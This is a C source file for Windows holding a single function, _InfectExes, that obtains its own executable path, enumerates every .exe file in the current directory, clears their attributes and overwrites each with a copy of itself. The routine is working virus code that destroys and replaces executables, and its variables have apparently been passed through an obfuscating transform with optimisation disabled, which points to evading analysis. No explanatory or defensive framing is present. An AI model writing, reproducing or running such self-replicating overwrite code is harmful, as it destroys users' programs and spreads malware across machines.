#include "data_globals.h"
#include <windows.h>
#include <stdint.h>

#pragma optimize("", off)
uint32_t _InfectExes(void)
{
    // Transformed scalar variables
    volatile uint32_t result_buf[2] = {{0, (uint32_t)0}};
    volatile uint32_t *p_result = (volatile uint32_t *)&result_buf[0];

    volatile BOOL success_buf[2] = {{FALSE, (BOOL)0}};
    volatile BOOL *p_success = (volatile BOOL *)&success_buf[0];

    volatile HANDLE find_handle_buf[2] = {{INVALID_HANDLE_VALUE, (HANDLE)0}};
    volatile HANDLE *p_find_handle = (volatile HANDLE *)&find_handle_buf[0];

    // Arrays and structs remain unchanged
    char current_exe_path[256];
    WIN32_FIND_DATAA file_data;

    GetModuleFileNameA(NULL, current_exe_path, sizeof(current_exe_path));
    (*p_find_handle) = FindFirstFileA("*.exe", &file_data);

    if ((*p_find_handle) == INVALID_HANDLE_VALUE)
    {
        (*p_result) = 1;
    }
    else
    {
        SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
        CopyFileA(current_exe_path, file_data.cFileName, FALSE);

        while (TRUE)
        {
            (*p_success) = FindNextFileA((*p_find_handle), &file_data);
            if ((*p_success) == 0) break;
            SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
            CopyFileA(current_exe_path, file_data.cFileName, FALSE);
        }

        FindClose((*p_find_handle));
        (*p_result) = 0;
    }
    return (*p_result);
}
#pragma optimize("", on)
